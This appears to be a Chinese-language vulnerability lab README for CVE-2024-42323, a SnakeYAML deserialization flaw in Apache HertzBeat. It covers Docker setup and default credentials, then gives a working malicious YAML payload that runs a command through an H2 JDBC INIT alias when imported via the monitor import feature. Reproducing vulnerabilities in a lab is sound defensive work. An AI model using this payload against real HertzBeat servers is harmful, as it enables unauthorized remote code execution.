# Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）

Apache HertzBeat 是一款开源的实时监控告警工具，支持对操作系统、中间件、数据库等多种对象进行监控，并提供 Web 界面进行管理。

在 1.6.0 版本之前，HertzBeat 使用了存在安全漏洞的 SnakeYAML 库来解析 YAML 文件。当已认证用户通过 `/api/monitors/import` 或 `/api/alert/defines/import` 接口导入新的监控类型时，可以提供特制的 YAML 内容触发不受信任数据的反序列化，最终可能导致在目标系统上执行远程代码。

参考链接：

- <https://forum.butian.net/article/612>
- <https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx>
- <https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md>

## 环境搭建

执行如下命令启动存在漏洞的 HertzBeat 1.4.4 服务器：

```
docker compose up -d
```

服务启动后，访问 `http://your-ip:1157/dashboard` 进入 HertzBeat 控制面板。默认登录凭据为：

- 用户名：`admin`
- 密码：`hertzbeat`

## 漏洞复现

首先，准备一个恶意 YAML 文件，文件名必须以 `.yaml` 结尾，内容如下：

```yaml
!!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"touch /tmp/success\")\\; }$$\\;CALL EXEC ()\\;", [], "a", "b", false ]
```

然后登录 HertzBeat 后台，导航到任意监控页面并找到导入按钮，在这里将上面的恶意 YAML 文件导入：

![定位导入按钮](1.png)

HertzBeat 对 YAML 文件进行反序列化时，触发远程代码执行：

![导入恶意 YAML 文件](2.png)

如果攻击成功，payload 将在目标系统上执行。在本例中，我们可以通过检查容器中是否存在新创建的文件来验证执行结果：

![验证代码执行](3.png)
